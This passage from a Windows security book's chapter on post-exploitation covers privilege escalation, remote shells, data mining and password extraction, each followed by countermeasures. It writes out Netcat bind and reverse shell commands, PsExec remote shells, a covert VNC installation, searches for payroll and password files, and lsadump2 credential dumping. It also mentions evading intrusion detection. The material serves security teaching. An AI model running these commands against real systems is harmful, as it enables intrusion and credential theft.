characters from the output, and in compiling the script back to binary  form, first fills in the common characters and then writes the differences into binary. When a binary is in ASCII format, any transport method can be used, such as echoing  the file through the Tabular Data Stream  TDS  protocol using the xp_cmdshell function   disabled by default in Microsoft SQL 2005  or using any script or vulnerability on the  target system, or pasting the file into a Terminal Services session.  In addition, the binaries can be packed with runtime packers such as Ultimate Packer  for  eXecutables   UPX ,  although  today  this  does  not  provide  as  much  benefit  for  an  attacker as it used to.  Toolkit Transfer Countermeasures You can’t do much to prevent the data transfer, other than harden the access in the first  place. If access is gained, accessibility to the system-provided binaries could be restricted  or removed totally.  Nearly all Windows file transfers used to be done using SYSTEM privileges, both by  exploiters and automated malware. If SYSTEM access to these tools is restricted, such  exploits cannot gain a foothold into the system.  Another trick is to move binaries that are commonly abused for unauthorized purposes  outside their normal location and restrict access to approved administrators. For example,  you could move %systemroot%\system32\debug.exe to another, less common location  and change access control lists  ACLs  to specific administrative accounts.  Privilege Escalation  Popularity: Simplicity: Impact: Risk Rating:  8 5 10 8  At this point in the assault, assume that the attacker has successfully authenticated to a  remote Windows system with a valid non-administrative user account and password. This  is an important foothold for the attacker, but unfortunately  from the attacker’s perspective ,  it  can  be  a  limited  one.  Recall  the  discussion  in  Chapter  2  about  standard  privileges  on  Windows—if you’re not Administrator-equivalent, your access to the system information  is  very  limited.  To  begin  pilfering  from  the  compromised  machine  and  the  rest  of  the  network, the attacker must raise access privileges to a more powerful account status.   Chapter 7:  Post-Exploit Pillaging   189  The  jargon  used  in  the  security  field  to  describe  this  process  is  privilege  escalation   sometimes privilege elevation . The term generically describes the process of escalating  the capabilities of the current user’s account to that of a more privileged account, typically  a  super-user  such  as  Administrator,  SYSTEM,  or  another  account  with  powerful  privileges.  From  a  malicious  hacker’s  perspective,  compromising  a  user  account  and  subsequently exploiting a privilege escalation attack can be easier than finding a remote  exploit  that  will  grant  instantaneous  super-user  equivalence.  In  any  event,  an  authenticated attacker will likely have many more options at his or her disposal than an  unauthenticated one, no matter what privilege level is gained.  Don’t underestimate the damage that can be done by a normal user, however. During  professional penetration testing engagements, we have occasionally overlooked sensitive  data  on  shares  that  can  be  mounted  by  a  compromised  user  account  in  our  haste  to  escalate to super-user status. Only later, while perusing the compromised system with  super-user privileges, did we realize that we had already found the data we were looking  for some time back!  Privilege escalation is also a popular form of attack for hackers who already have  access  to  a  system,  particularly  if  they  have  interactive  access  to  a  Windows  system.  Picture this scenario: An employee of the company wants to obtain salary information  about his peers and attempts to access internal human resources or financial databases  via a legitimate Terminal Server connection. Once authenticated, a privilege escalation  exploit could elevate this user to the level of privilege necessary to query and examine  sensitive corporate compensation data. While you’re considering this scenario, remember  that statistics readily demonstrate that the majority of computer crime is still committed  by legitimate internal users  employees, contractors, temps, and so on .  Historically, numerous well-known privilege escalation vulnerabilities have existed  in  Windows,  including  the  following  known  bugs  exploiting  different  vectors—here  shown only as an example for areas that have contained exploitable vulnerabilities:     Getadmin    Service Control Manager Named Pipe Prediction    NetDDE requests run as SYSTEM    Debugger authentication ﬂ aws  DebPloit and similar exploits   The  public  releases  of  serious  privilege  escalation  exploits  have  slowed  somewhat  since the release of Windows XP, and even more so with the release of Windows Vista.  However, that is not an excuse to lower your guard against this debilitating type of attack. One such exploit, the GDI exploit, was published on MOKB-06-11-2006  Month of  Kernel  Bugs;  see  “References  and  Further  Reading” .  This  bug  has  been,  until  recent  advancements  in  2007,  unreliable  to  exploit.  The  bug  is  in  a  problem-related  global  shared  memory  section  that  is  created  automatically  in  any  Windows  process  using  Graphics Device Interface  GDI  objects. This section is typically mapped read-only, but  any process can remap it as read-write, thus allowing writes to this section and overwriting  GDI kernel data structures, causing arbitrary code execution or denial of service  DoS   attacks, depending on the exploit and payload. A sample exploit from the MOKB archives  that  causes  DoS  and  other  information  can  be  seen  on  the  MOKB  web  page.   See  “References and Further Reading.”    190   Hacking Exposed Windows: Windows Security Secrets & Solutions   Privilege Escalation Countermeasures Along with applying the various patches, you should follow security best practices to  mitigate risks and prevent intruders from obtaining even low-privileged accounts, which  might allow access to information to be protected. The specifics of securing a system  depend  on  the  role  of  the  system—for  example,  whether  the  system  is  a  public  web  server or an internal file and print server. However, a few general tactics can be used to  limit the effectiveness of privilege escalation attacks:     Nearly all Windows privilege escalation exploits to date have required   an INTERACTIVE logon session to perform the attacks. Thus, restricting the  INTERACTIVE logon privilege is a key countermeasure against privilege  escalation.  Don’t forget users who can log in via Terminal Services, which  is the near-equivalent of INTERACTIVE.  Be especially sensitive to  service accounts, which typically are highly privileged but do not require  INTERACTIVE logon—don’t give access to them!     Restrict access to system programs that users do not require, such as cmd.exe.   Without access to critical system binaries, an intruder or a malware will be  substantially limited.     Use the Restricted Groups feature in Group Policy to prevent accounts from   being added to privileged groups on a Windows domain.     Use Software Restriction policies to limit the users’ ability to “hurt” themselves   and minimize the possibilities for attack. In Windows XP SP2 it is possible to  access two new policies by adding the following registry key: Levels"=dword:00031000 to  [HKLM\SOFTWARE\Policies\Microsoft\Windows\Safer\CodeIdentifiers]    This gives a ﬁ ne-grained ability to add protection. The following levels can be   assigned:   Disallow  Software will not run, regardless of access rights of the user   Untrusted  Allows programs to execute with access only to resources  granted to open well-known groups, blocking access to Administrator  and Power User privileges and personally granted rights    Restricted  Software cannot access certain resources, such as cryptographic   keys and credentials, regardless of the access rights of the user    Basic Users  Allows programs to execute as a user that does not have   Administrator or Power User access rights, but can still access resources  accessible by normal users    Unrestricted  Software access rights are determined by the access rights of   the user     Audit Windows events to detect malicious behavior. See Chapter 2 for a   discussion of recommended audit settings in Windows.   Chapter 7:  Post-Exploit Pillaging   191     In Windows Vista local security policy, you can restrict who has privileges to   perform impersonation.     For physical access required steps, set the system to boot from hard disk only,   and set a proper BIOS password to limit the amount of people who can perform  these kinds of steps.     With advancements with security event management tools, the ability to notice   discrepancies from normal behaviors has increased. This means gathering  Windows Event Log data, together with the intrusion detection system  intrusion protection system  IDS IPS , NetFlow, and so on, into one monitoring  station and making intelligent analyses without relying on only one source.  REMOTE INTERACTIVE CONTROL  Remote interactive control is always the desired next step for the attacker. The attacker  gains the ability to control a system remotely as if he or she were physically sitting at the  console. In the Windows world, this can be accomplished in one of two ways: through a  command-line interface such as a telnet-like connection, or through a GUI such as those  found  with  Terminal  Services  or  similar  third-party  remote  control  products  such  as  Virtual Network Computing  VNC .  Another opportunity for an attacker is created when users install third-party remote  accessibility software to their systems, such as GoToMyPC, which offers another venue  to attack.  Command-Line Control 10 7 9 9  Popularity: Simplicity: Impact: Risk Rating:  Believe it or not, in a galaxy not too far away  the 1990s , many people believed that  Windows  was  more  secure  than  UNIX  because   get  this   “you  can’t  get  a  command  prompt on Windows.” Well, we are here to dispel this myth  if it still exists  officially, and  to tell you that, as in the UNIX world, command-line control of Windows is very much a  reality.  We’ve  used  a  number  of  techniques  for  gaining  remote  command-line  access  to   Windows over our combined years of penetration testing, including the following:     Remote.exe  combined with the built-in Windows scheduler, at.exe, to launch it   remotely at a speciﬁ ed time      Remote Server Setup command  rsetup  from the Windows NT 2000   Resource Kit   192   Hacking Exposed Windows: Windows Security Secrets & Solutions      Wsremote from the Windows 2000 Resource Kit    PsExec from Sysinternals  Each of these tools has its strengths and weaknesses, but our favorites remain Netcat for  flexibility  and  PsExec  for  simplicity   if  Windows  file  and  print  sharing  services  are  accessible on the target system . We describe how to use both of these tools to achieve  command-line remote control next.  Netcat Console The  tool  with  1000  different  uses,  Netcat  can  be  used  to  gain  remote  command-line  control over a system. Two primary techniques exist.  The first technique utilizes Netcat in listening mode, which must be run on the target   server itself: C:\>nc –L –n –p 2000 –e cmd.exe  Note that this will require you to follow up with a Netcat connection to the target system  on port 2000: C:\>nc 192.168.0.5 2000 Microsoft Windows 2000 [Version 5.00.2195]  C  Copyright 1985-1999 Microsoft Corp. C:\>ipconfig ipconfig  Windows 2000 IP Configuration  Ethernet adapter Local Area Connection:          Connection-specific DNS Suffix  . :         IP Address. . . . . . . . . . . . : 192.168.0.5         Subnet Mask . . . . . . . . . . . : 255.255.255.0         Default Gateway . . . . . . . . . : 192.168.0.1  Also, note that the privilege gained by the Netcat technique is dependent on the privilege  of the running user  in our case, Administrator : C:\WINDOWS\system32>whoami whoami he-w2k3\administrator  When using an interactive Netcat prompt, you will get an echo back of your original command  as  shown in the preceding code snippet with the command whoami .   Chapter 7:  Post-Exploit Pillaging   193  To use the second technique, follow these steps:  1.  Execute Netcat to send a command shell back to a listening Netcat window.   First you must start a Netcat listener: C:\>nc –l –p 3000 –nvv  2.  Now execute the nc command on the remote system to send back the   command shell: C:\>nc –e cmd.exe –n 192.168.0.2 3000  3.  Switching back to your Netcat listener now, you should see this:  listening on [any] 3000 ... connect to [192.168.0.2] from  UNKNOWN  [192.168.0.5] 2537 Microsoft Windows 2000 [Version 5.00.2195]  C  Copyright 1985-1999 Microsoft Corp.  C:\>   And, once again, a command-line window on the remote system is at your beck  and call.              If you are doing an assignment for a client over “untrusted” networks, it is a good practice to use  Netcat variants that support cryptography for transport. This is intended mainly to protect customer  information from curious eyes, but it also bypasses intrusion detection, which is not following encrypted  traffic.  PsExec When run from the command line on a remote attacker’s system  with access to Windows  file and print sharing services on the victim machine , PsExec simply runs commands on  the remote machine. If you specify cmd.exe as the command, it opens up a remote shell.  Since it silently installs a service on the remote machine, all of this happens seamlessly  and transparently to the attacker.  In the following example, we first set up an administrative connection with the victim  server named 192.168.0.5.  Remember that we know the credentials for an administrative  account at this point.  C:\>net use \\192.168.0.5\ipc$ password  u:administrator The command completed successfully.  Then we run PsExec and launch cmd.exe:  C:\>psexec \\192.168.0.5 cmd.exe PsExec v1.3 - execute processes remotely Copyright  C  2001 Mark Russinovich www.sysinternals.com   194   Hacking Exposed Windows: Windows Security Secrets & Solutions   Microsoft Windows [Version 5.2.3790]  C  Copyright 1985-2003 Microsoft Corp.  C:\WINDOWS\system32>  Voila! Remote shell.  PsExec  can  also  take  command-line  arguments  if  you  just  want  to  enter  the   administrator’s credentials all in one fell swoop. Here’s an example: C:\>psexec \\192.168.0.5 -u administrator -p password cmd.exe  Use  the –s  argument  if  you  want  the  command  run  as  LocalSystem.   In  the  last   example, simply prepend –s to the cmd.exe argument.   PsExec starts the psexecsvc on the target machine, which can be noticed by a savvy  administrator. Interestingly, you can kill psexecsvc with no ill effects on your shell, so  this could be a way for a hacker to hide his tracks once the shell is up.  Note that while a remote prompt is thought to be “limited” functionality-wise, the  power to control a whole system can be gained similarly from the command line in the  same  way  as  from  graphical  interface—for  example,  by  using  net  commands,  netsh,  regedit, or by dumping the Registry with regedit.  Graphical Remote Control  Popularity: Simplicity: Impact: Risk Rating:  9 6 9 8  While most attackers are content with gaining command-line control over a target,  for the true Windows aficionados, this is only half the challenge. The ultimate goal of any  true Windows hacker is to gain complete GUI control over the system, effectively taking  it over as if he or she were sitting directly at the keyboard of the remote system.  The most obvious way to gain a remote GUI is to do so on a system that is already  hosting services that allow remote control. In Microsoft’s out-of-the-box graphical remote  administration  functionality,  Terminal  Services,  graphical  data  is  transferred  between  Terminal  Services  client  and  server  via  the  Remote  Desktop  Protocol   RDP ,  which  operates over TCP port 3389 by default  although it is fairly trivial to change this port  using  the  configuration  published  at  http:  support.microsoft.com kb 187623 .  We  described some tools and techniques for usurping Terminal Services in Chapter 5.  Even  if  Terminal  Services  is  not  running  on  the  target  system,  if  the  attacker  has  remote access to the system, it is possible for him or her to install and start Terminal  Services   RDP   over  WMI  remotely.   For  more  on  WMI  usage,  see  “References  and  Further Reading.”    Chapter 7:  Post-Exploit Pillaging   195  One of the best non-native techniques we know of for remote graphical control uses  Virtual  Network  Computing   VNC ,  originally  from  AT&T  Research  Laboratories  in  Cambridge, England, and now commercialized by RealVNC  www.realvnc.com . The  VNC program is a lightweight, highly functional remote-control application. Running  VNC  remotely  does  take  some  manual  labor,  but  the  fruits  of  that  labor  can  be  exhilarating.  First off, make sure your administrative share is still intact and be sure you have a  command-line shell on the remote system already established. Then follow these steps:     1.  Create the following ﬁ le and name it winvnc.ini.  This will set your password   to secret to connect with VNC securely.  HKEY_USERS\.DEFAULT\Software\ORL\WinVNC3     SocketConnect = REG_DWORD 0x00000001     Password = REG_BINARY 0x00000008 0x57bf2d2e 0x9e6cb06e     2.  Copy the following ﬁ les to the target system:  C:\>copy regini.exe d:\windows\system32 C:\>copy winvnc.ini d:\windows\system32 C:\>copy winvnc.exe d:\windows\system32 C:\>copy vnchooks.dll d:\windows\system32 C:\>copy omnithread_rt.dll d:\windows\system32  3.  Update the Registry with your winvnc.ini settings:  C:\>regini -m \\192.168.0.5 winvnc.ini              4.  From the remote system’s command line, install the winvnc service:  Remote C:\>winvnc –install  5.  Start the service:  Remote C:\>net start winvnc  6.  From your system, start the vncviewer application that comes with the   distribution and point it to your target, 192.168.0.5:0  the 0 is for the display .  Type in the password secret, and you should have complete GUI control as if  you were sitting at the physical machine. If you wish to use the Java version  of the GUI, you can connect with your browser to port 5800: http:  192.168.0.5:5800   196   Hacking Exposed Windows: Windows Security Secrets & Solutions   Port Redirection  Popularity: Simplicity: Impact: Risk Rating:  6 8 9 8  We’ve discussed a number of techniques used for gaining remote interactive control of  a  Windows  system.  However,  all  these  have  been  based  on  the  prerequisite  of  direct  connections. In many instances, having a direct connection into a system is simply not  available, and a more indirect method must be devised. This is the job of port redirectors. Once  an  attacker  compromises  a  target,  he  or  she  can  use  port  redirection  tools  to  forward packets to a specified destination beyond a firewall. Basically, this technique turns  a firewall into a doorstop. In essence, port redirectors move the activities on one port over  to another. A good example of this is when a firewall allows all ports above 1024 into the  target network, but the firewall blocks the Windows system ports 139 and 445  the ones the  attacker really wants . So, once a system has already been compromised behind the firewall  with a web exploit or a Solaris bug, the attacker can set up a port redirector to redirect the  traffic from one port, say 2000, to the real port that she wants, say 139:   Chapter 7:  Post-Exploit Pillaging   197  This  type  of  attack  enables  an  attacker  potentially  to  access  any  system  behind  a  firewall.  One of our favorite port redirectors for Windows systems is fpipe, a TCP redirector  from Foundstone, Inc. The program works much like traditional port redirectors with one  significant difference: the attacker can specify a source port address. Setting a source port  address allows the attacker to set the source port statically to something that the firewall  in between the attacker and their target will allow. For example, the attacker may find a  firewall that allows traffic through if the source port of the traffic is TCP port 20. This can  be a common firewall misconfiguration, as TCP port 20 is required for outbound FTP  traffic  to  work.  Also,  in  versions  earlier  than  Vista,  Windows  IPSec  implementation  permits traffic with a source port of TCP UDP 88 as well as all broadcast traffic to pass  IPSec filters by default  see Knowledge Base article 810207 . Fpipe can be used to source  attacks to IPSec-protected systems if this default configuration is not changed.  Countermeasures to Remote Control If an attacker has administrative credentials on a system, you can’t do much to stop him  or her from exercising such control remotely, beyond simply shutting down remote net- work access to the system altogether. For example, eliminating access to the NetBIOS  over TCP IP port  TCP 139  or the SMB over TCP port  TCP 445  can mitigate against  remote interactive control using tools like PsExec, which require those services to oper- ate. More broadly, it’s always good to ensure that your firewall rules do not allow unau- thorized communications  for example, Microsoft Terminal Services RDP protocol, TCP  3389  to sensitive hosts.  To determine whether someone has “remoted” your own local system, you can use  the built-in netstat tool to see if you can identify rogue listening  or connected!  services.  Foundstone’s Vision tool also excels at this and offers the ability to kill potentially rogue  processes right from the GUI. The PipeList tool from Sysinternals is good for displaying  all the named pipes that are being used on a system, revealing PsExec connections and  other remote sessions via named pipes.  Also  native  commands  on  XP,  Windows  2003,  and  up  can  be  useful  to  determine  whether something has happened; however, you need to be careful because those tools,  if run on the potentially cracked system, might have been replaced with trojanized tools  or the DLLs they use. Commands can include, but are not limited to, NET.EXE, NETSTAT .EXE with new options, and TASKLIST.EXE.  If you are one of the unlucky ones who finds an intruder on your system, you can kill  the attacker’s connection and then remove the offending program. For example, WinVNC  can be removed using the following commands: C:\>net stop winvnc C:\>winvnc –remove C:\>reg delete HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\WinVNC   198   Hacking Exposed Windows: Windows Security Secrets & Solutions   Mining System Data  Popularity: Simplicity: Impact: Risk Rating:  9 5–8 9 9     File searching    Keystroke logging    Trojan logon screens    Packet snifﬁ ng  Each is discussed in the following sections.  One of the next steps an attacker will take once administrative access is gained is to  mine the system for sensitive data that could lead to further compromise. Numerous  techniques can be used for mining this data:  File Searching With  a  Windows  command  shell,  an  attacker  will  either  use  the  tools  native  to  the  operating system or upload his own. Native tools on Windows that can be put to nefarious  use include dir, find, and findstr. The dir  and  find  commands  are  quite  primitive  relative  to  findstr,  which  competes with the legendary UNIX grep utility. The beauty of findstr is the utility’s  versatility. For example, the program can look at the beginning   B  or end   E  of the  line only for the string. We frequently use it for its subdirectory searching   S  feature. In  the following example, we use findstr to check all the Excel spreadsheets  .xls  on the  C: drive for the word payroll: C:\>findstr  s "payroll" *.xls  Finally, a number of vendors make free Windows versions of popular UNIX tools  such as grep, sed, awk, and others. A number of these tools are included in the Window  Resource Kit, including grep.exe. Also, software vendors such as Mortice Kern Systems,  Inc.  MKS , and Cygwin offer UNIX tools ported to the Windows platform. Any serious  Windows security professional should have such tools in his or her toolkit.  To use grep on a remote system, just upload the file to the directory of your choice   and type the following: C:\>grep "password" *.*  This will search all the files in the current directory for the word password.   Chapter 7:  Post-Exploit Pillaging   199  The graphical equivalent of these command-line tools is simply using your favorite  directory  viewer  such  as  Windows  Explorer  or  the  Windows  search  feature  itself.  Mapping a drive on the target machine  H:  and then searching the entire drive for files  with certain keywords is trivial.  More recently, with the proliferation of desktop search clients that passively index  entire hard drives, performing such searches has gotten much easier. Attackers will seek  out Google Desktop, MSN Windows search services, and similar utilities for this reason.  Windows Vista integrates search into just about every UI in the operating system, from  the Start menu to the default Windows Explorer.  Keystroke Logging If none of the preceding steps leads to any juicy information, or none can be leveraged to  gain deeper access into the network, an attacker will try to put a keystroke logger on the  system that will sniff passwords from the keyboard. The premise is simple: sooner or  later someone on the affected system will log in to another system or another Windows  domain, and the keystroke logger will catch the user’s credentials.  Keystroke loggers are typically fairly stealthy in that most often they sit between the  keyboard  hardware  and  the  operating  system,  on  a  kernel  level,  recording  every  keystroke. Numerous Windows keystroke loggers exist today. One we’ve used frequently  is Invisible Keylogger Stealth  IKS   see “References and Further Reading” . This product  is installed as a low-level device driver, so it’s always running and can capture even the  CTRL-ALT-DEL sequence and password to log in to the system itself.  In addition, IKS is built for remote installation  directions exist in the readme file .  The  only  downside  is  that  the  keylogged  system  must  be  rebooted  before  the  device  driver can begin sniffing the keystrokes. Of course, this can be done quite easily assuming  one of the remote interactive control mechanisms discussed earlier in this chapter has  been implemented. Numerous keyloggers exist, all of which use different methods to get  captured information to the attacker—some examples include local encrypted textfiles,  communication  channels  through  SMTP,  and  HTTP.  Again  the  “benefits”  of  using  encrypted obfuscated text versus cleartext to protect data are valid.  Trojan Logon The Graphical Identification and Authorization  GINA  is the middleman between the  user and the Windows authentication system in versions prior to Vista. When you boot  your computer and the screen asks you to type CTRL-ALT-DEL to log in, this is the GINA in  action. Of course, due to the intimate nature of the GINA, many hackers have focused  much attention on inserting malicious code in between the user and the operating system  in order to capture passwords.  One  issue  with  some  sample  custom  GINA  is  that  when  administrators  add  new  patches to the system it might cause instability issues due to having components, in this  case custom GINA, which are not original vendor-submitted ones.   200   Hacking Exposed Windows: Windows Security Secrets & Solutions   For example, FakeGINA from Arne Vidstrom of Ntsecurity.nu  see “References and  Further Reading”  intercepts communication requests between Winlogon and the GINA,  capturing  the  CTRL-ALT-DEL  username  and  password.  FakeGINA  then  writes  those  captured usernames and passwords in a text file. FakeGINA is relatively easily installed  from a remote hacker’s system with the ability to edit the Registry and reboot the system  remotely.  In  Windows  Vista,  the  GINA  model  was  discontinued  and  replaced  by  the  more  powerful Credential Provider model. This new model is extendable and based on the  COM technology.  It  is  possible  to  intercept  data  sent  to  one  of  the  default  Credential  Providers  by  creating a COM proxy that sits between the original Credential Provider and the user.  Because several examples of how to achieve this are currently available on the Internet,  we will not go deeper into the topic here.  See “References and Further Reading” for  more information.   Authenticating data can also be accessed by adding extensions to the Local Security  Authority   LSA   subsystem,  such  as  network  providers,  password  complexity  DLLs,  and so on. One countermeasure for hacking the LSA subsystem is to block ACL write  access to certain registry keys. Here’s an example: HKLM\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order  Name ProviderOrder  Data Type Not needed on ACL change Not referred due to ACL change  Value  Packet Snifﬁ ng “Sniffing” packets off the wire during normal authentication is one of the most effective  ways  of  gleaning  usernames  and  passwords.  This  is  possible  because  many  common  network protocols  such as telnet and FTP  do not implement encryption and therefore  pass credentials over the wire in cleartext.  Probably one of the most popular commercial tools for general packet analysis is the  tried-and-true Sniffer Pro from Network Associates, Inc.—now Network General. The  early  command-line  version  has  been  the  staple  of  many  a  network  administrator’s  toolkit,  and  its  Windows  product  has  quickly  extended  its  dominance.  A  popular  Windows command-line packet analyzer is the free Snort tool.  A number of utilities are commonly used by hackers to listen for and extract user- names and passwords from network traffic. The original dsniff application was written  for UNIX by Dug Song. Dsniff is one of the best-written packet capture engines available.  It automatically parses a variety of applications and retrieves only the username and  passwords  for  each.  The  initial  Win32  port  of  dsniff  was  written  by  Mike  Davis.  The    Chapter 7:  Post-Exploit Pillaging   201  Win32 port does not include many of the utilities found in the UNIX version, such as  arpredirect, but it performs the functions needed for sniffing passwords.  Wireshark is an amazing cross-platform sniffing tool. It comes in both graphical and  command-line  versions.  The  graphical  tool  ships  with  protocol  decodes  that  are  comprehensive  and  up  to  date.  The  command-line  version  is  called  tethereal,  and  it  requires that the Winpcap driver be installed on the remote system. Use the undocumented  -n  switch  to  run  tethereal  without  name  resolution—this  significantly  improves  performance because it won’t try to resolve all the hostnames of the addresses it finds on  the network automatically. Currently, Wireshark does not automatically parse packets  and extract authentication data like most of the other tools we’ve mentioned here, but we  still love this tool.  Countermeasures for Data Mining As with most of the attacks discussed in this chapter, the best countermeasure is barring  an attacker from gaining administrative privilege on your system in the first place. If a  hacker has already gained this privilege to your system, your best recourse is to restore  from trusted backups.  We also recommend that you read Chapter 8 to learn how to uncover stealth software  on your system. One interesting theme we’ve encountered is the requirement to reboot  victim systems after low-level hacking tools have been installed  such as keyboard logger  drivers and fake GINAs . Good Event Log–monitoring hygiene should catch unscheduled  reboots like this. However, a lack of reboots should not be considered proof that a fake  GINA or other such tool has not been installed.  The only true countermeasure for network sniffing is the use of encryption technology  such as Secure Shell  SSH , Secure Sockets Layer  SSL , secure e-mail via Pretty Good  Privacy  PGP , or IP-layer encryption like that supplied by IPSec-based VPN products.  This is the only hard and fast way to fight sniffing attacks.  Using  IPSec  packet  authentication  and  encryption  is  effective  for  decreasing  the  crackers’ ability to gain access to network traffic. On the other hand, an attacker can try  to  do  different  man-in-the-middle  attacks  for  these  protocols;  in  this  cat-and-mouse  game, the user has to verify that an endpoint  where communication “ends”  is who it  claims to be. This can be achieved by checking certificates, using SSH fingerprints, and  various other measures.  PASSWORD EXTRACTION  Once  administrator  access  is  achieved,  the  attacker  will  typically  attempt  to  pilfer  additional  passwords  from  your  system.  By  collecting  passwords,  the  attacker  is  effectively collecting keys to various doors within the Windows environment. Each new    202   Hacking Exposed Windows: Windows Security Secrets & Solutions   password offers potential access into another component of the system, such as the SQL  database, the Excel payroll file, the web administrator directory, and other components  identified during data mining.  In  addition,  these  passwords  can  be  used  to  gain  access  into  other  systems  and  environments across the network, including Windows domains, SQL Server instances,  Microsoft  Office  collaboration  servers   Exchange,  SharePoint,  and  so  on ,  SNA  gateways,  web  application  administration  interfaces,  and  other  juicy  targets.  If,  for  example,  an  attacker  were  able  to  gain  administrative  access  onto  a  Windows  XP  desktop  client  and  identified  a  local  service  running  in  the  context  of  a  privileged  domain  user,  she  might  be  able  to  extract  the  locally  cached  credentials,  leading  to  compromise  of  the  entire  Windows  domain.  In  our  professional  penetration  testing  experience, this is the single most lucrative line of investigation for malicious attackers,  since password reuse is typically widespread in large distributed environments, thanks  to basic human inability to remember much more than five or six complex passwords  at any one time.  A number of methods can be used to store passwords on the system. We’ll look at  each  place  these  passwords  are  stored  and  the  mechanisms  used  to  obtain  the  passwords.  LSA Dumping  Popularity: Simplicity: Impact: Risk Rating:  9 9 9 9  The LSA cache has been available for techniques for dumping cleartext passwords  since Windows NT 4.0  assuming the attacker is logged in as Administrator or equivalent .  Similar techniques still work on Vista but require SYSTEM privileges.  This vulnerability definitively demonstrates the danger of storing credentials in the  Registry of Windows systems, especially if storage is located in the places where lower  privileges are needed to access it. Peering into the LSA Secrets area of the Registry, an  attacker can view the following:     Windows service account passwords in plaintext  basically . These passwords   are obfuscated with a simple algorithm and can be used to compromise an  external system in another domain altogether.     Web user and FTP plaintext passwords.    Computer account passwords for domain access.    Cached password hashes of the last 10  or more  logged-on users.   Chapter 7:  Post-Exploit Pillaging   203  The original idea for the LSA Secrets exploit was publicly posed to the NT Bugtraq  mailing list in 1997 by Paul Ashton. A tool based on this concept was written by the  Razor  Team  and  is  available  online:  it’s  called  lsadump2  and  is  available  at  www. bindview.com services razor utilities .  Lsadump2  uses  the  same  technique  as  pwdump2 to inject its own DLL function calls under the privilege of the running Local  Security Authority Subsystem Service  LSASS  process. Another tool that can dump the  same information is Cain & Abel.  Following is the typical methodology employed by an attacker:  1.  The attacker ﬁ rst gains an administrative or higher connection to the target and   starts a remote shell.  system’s drive.  2.  The attacker uploads the lsadump2.exe and lsadump.dll ﬁ les to the remote   3.  Now the attacker can run the lsadump2 command to dump the credentials:           C:\>lsadump2 … D6318AF1-462A-48C7-B6D9-ABB7CCD7975E-SRV  39 FD 26 E5 03 4C 89 47 89 0C AE 60 37 DD FE 15  9.&..L.G...`7...

At the end of this printout are the two SQL service accounts and their associated passwords.  An attacker can use this password, 2happy4m, to gain extended access to the network and  its resources.  Older versions of lsadump2 required you first to identify the ID of the LSASS process. This is no longer  necessary in the updated version, which automatically performs this function.  While Microsoft developed different protection systems for Windows XP  and newer   versions,  some  of  the  old  tools,  such  as  lsadump2,  might  not  work  well  directly  but  instead  require  higher  privileges  or  small  modifications.  Data  Execution  Protection   DEP  systems, for example, require small changes to the code of these older tools. Here’s  an example, starting with the original code snippet from lsadump2.c: MEM_COMMIT, PAGE_READWRITE ;  And here’s an example with DEP systems: MEM_COMMIT, PAGE_EXECUTE_READWRITE ;   204   Hacking Exposed Windows: Windows Security Secrets & Solutions   A  link  to  more  changes  was  posted  on  mailing  lists  in  2005,  and  the  link  to  Full- Disclosure’s post is included in “References and Further Reading” later in the chapter.  Lsadump2 can also be modified to work in Windows Vista and Windows 2008, and code  changes are generally the same as those described for pwdump2 a bit later in this chapter   see “Dumping SAM and AD Passwords” .  Another  area  of  interest  are  the  cached  domain  passwords.  By  default,  Windows  stores the last 10 interactively logged-on users in this cache. In Windows Server 2008, the  default value of stored logons is  as of this writing  set to 25. Storing is accomplished by  hashing the hash of the credential, which means that cracking is possible but more slowly  than it normally is from otherwise obtained password hashes. Logon caching is required  because  when  the  machine  is  not  connected  to  the  network,  such  as  when  its  user  is  traveling or if the machine cannot resolve authentication servers, access to the verifier  must be available to administrators or techs to grant login to the computer to maintain  the machine. One of the first public tools for cracking cached domain passwords was  CacheDump, which can be found on the Internet. You can rely on tools such as Cain &  Abel or others that do the same thing.  LSA Secrets Countermeasures Because lsadump2 requires the SeDebug privilege, which is granted only to administra- tors by default, Microsoft considers this to be the area of a trusted administrator. Conse- quently, Microsoft considers this a feature and therefore few countermeasures have been  made available. The only real countermeasure in this scenario  apart from avoiding giv- ing up administrator access to an attacker  is to avoid using services with passwords  not  very realistic, we know . Or you could harden the system to limit damages done quickly  by attackers in the first place.  To mitigate the potential damage for dumping the cached domain password hashes,  it is good practice to set the amount of cached logins to 1. This still allows cached login  for user, but it lowers the number of accounts that can be attacked via this mechanism  from the default of 10  or 25 in Server 2008 . This can be set by the following Registry  entry: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon  Name CachedLogonsCount  Data Type REG_SZ  Value 1  Extracting Data from the Protected Storage Service The Protected Storage service is an application programming interface  API  designed to  store information in a secure way. The data inside the protected storage is Triple DES  encrypted with a key tied to the user’s Windows credentials and transparently accessible  for all programs running in the user’s context.   Chapter 7:  Post-Exploit Pillaging   205  Applications  that  use  the  Protected  Storage  service  include  certain  versions  of  Outlook, Outlook Express, MSN Explorer, and Internet Explorer versions 4 to 6. Starting  with IE 7, sensitive data is stored using the Data Protection API instead.  Protected Storage PassView from NirSoft is one tool capable of extracting data from   the logged-on user’s Protected Storage, as shown in Figure 7-1.  Introduction to Application Credential Usage and the DPAPI  The Data Protection Application Programming Interface  DPAPI  is a set of operating  system–based functions that provides data encryption and tampering protection. The  public part of the API is implemented as part of the CryptoAPI and is available to all  running processes as part of the crypt32.dll. The private part of the API is available only  to threads running within the LSASS process.  Figure 7-1  PassView from NirSoft extracts data from the logged-on user’s protected storage.   206   Hacking Exposed Windows: Windows Security Secrets & Solutions   The  DPAPI  can  be  used  to  protect  both  in-memory  data  and  offline  data.  The  functions used to encrypt data are CryptProtectData and CryptProtectMemory. functions  are  CryptUnprotectData  and  The  CryptUnprotectMemory.  corresponding  decryption   The data encryption can be either system-wide or user-specific, meaning that either  all users on a specific system can decrypt the data or only the specific user encrypting the  data is capable of decrypting it. When encrypting data for a specific user, DPAPI uses the  logged-on user’s password to associate the encryption with a specific user. The user will  never notice this as the system transparently uses the password. An application that calls  the DPAPI encryption functions sends plaintext data to DPAPI and in return receives a  protected data BLOB. Decryption is done in the reverse, by passing the data BLOB to the  decryption function and receiving the plaintext data in return.  Using the logged-on user’s password is, however, not enough if an application wants  to  protect  data  from  other  processes  running  in  the  same  user  context.  The  DPAPI  functions  also  accept  an  additional  passphrase  or  entropy,  which  will  be  required  to  decrypt  the  data  successfully.  Examples  of  applications  that  uses  the  DPAPI  to  store  sensitive data securely are the Remote Desktop Connection client and IE 7.  Recovering Dumping Passwords in Internet Explorer 